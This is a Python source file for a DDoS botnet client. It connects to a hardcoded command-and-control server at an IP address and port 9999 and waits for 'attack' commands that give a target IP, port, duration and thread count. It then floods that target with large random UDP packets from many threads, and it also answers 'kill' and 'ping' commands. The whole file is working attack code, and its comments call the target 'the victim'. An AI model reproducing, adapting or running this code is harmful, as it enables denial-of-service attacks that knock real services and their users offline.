from threading import Thread
from time import time, sleep
import socket, signal
import sys, random
from typing import Tuple
class Client():
	run=False
	def __init__(self, connect:Tuple[str,int]=("118.71.27.70",9999)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		while not self.stop:
			try:
				self._connect(connect)#connect to server
			except KeyboardInterrupt:
				continue
			except Exception as e: #if the connection has interupt or error, they throw the exception.
				print(f"Error connecting {connect}| Sleep 10 seconds")
				sleep(10)

	def exit_gracefully(self,signum, frame): #Exit the program.
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None: # create socket to connect to victim.
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.start()

	def __ddos(self,*args):

		def dos(*args): #*args truyền bao nhiêu tham số vào cũng dc
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240) #random the size of udp packet .
			s.connect((host, int(port))) #connect to the  victim
			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port))) #send udp packet to the victim.
				
			s.close()
			print("run time {}".format(time()-t1))
		for n in range(int(args[4])):
			Thread(target = dos,args=[*args]).start() #create a thread to perform of attack.
		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower() #decode data send from server.

	def start(self):
		while True:
			data = self._recv()
			if "attack" in data:

				data=data.replace("attack ","").split()
				try:
					proto, ip, port, sec, thread =  data #tge data include the ip, port, protocol, and thread
					data = proto, ip, int(port), int(sec), int(thread)
					self.sock.send("done".encode("ascii"))
				except Exception as e:
					print(e)
					self.sock.send("invalid command".encode("ascii")) #if the code has exception from sending the data, we will send the "invalid command" back to the server.
					continue

				self.run=True
				Thread(target = self.__ddos,args=data).start() # create a thread to perform ddos attack.
			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("Server Stopped")) # stop the server.
			elif "ping" in data:
				self.sock.send(str.encode("Pong"))
			else:
				self.sock.send(str.encode("ERROR"))


if __name__ == '__main__':
	Client()
